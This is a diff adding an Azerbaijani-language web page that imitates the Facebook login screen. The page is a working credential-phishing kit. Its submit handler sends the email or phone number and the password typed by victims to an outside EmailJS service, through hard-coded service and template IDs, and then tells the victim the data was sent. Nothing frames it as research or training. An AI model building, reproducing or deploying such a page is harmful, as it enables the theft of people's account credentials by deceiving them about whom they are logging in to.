@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Giriş</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init("MCZSvecro8L_p9EY-"); // Buraya EmailJS Public Key yaz
+    })();
+  </script>
+</head>
+<body class="bg-gray-100">
+
+  <div class="flex items-center justify-center min-h-screen">
+    <div class="max-w-4xl w-full flex flex-col md:flex-row items-center justify-between px-4">
+      
+      <!-- Solda yazı -->
+      <div class="mb-10 md:mb-0 md:mr-10">
+        <h1 class="text-blue-600 text-5xl font-bold">facebook</h1>
+        <p class="text-2xl mt-4">Dostlarınızla əlaqə saxlayın və paylaşım edin.</p>
+      </div>
+
+      <!-- Sağda giriş formu -->
+      <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm">
+        <form id="loginForm">
+          <input name="user_email" type="text" placeholder="E-mail və ya telefon nömrəsi"
+            class="w-full p-3 border border-gray-300 rounded-md mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+
+          <input name="user_password" type="password" placeholder="Şifrə"
+            class="w-full p-3 border border-gray-300 rounded-md mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
+
+          <button type="submit"
+            class="w-full bg-blue-600 text-white font-semibold py-3 rounded-md hover:bg-blue-700 transition">Giriş</button>
+
+          <div class="text-center text-sm text-blue-600 mt-4 cursor-pointer hover:underline">Şifrəni unutmusunuz?</div>
+
+          <hr class="my-4" />
+
+          <button type="button"
+            class="w-full bg-green-500 text-white font-semibold py-3 rounded-md hover:bg-green-600 transition">Yeni hesab
+            yarat</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const loginForm = document.getElementById("loginForm");
+
+    loginForm.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      emailjs.sendForm('service_2s5n70l', 'template_xcdd1mc', this)
+        .then(function () {
+          alert("Məlumat uğurla göndərildi!");
+        }, function (error) {
+          alert("Xəta baş verdi: " + error.text);
+        });
+    });
+  </script>
+
+</body>
+</html>
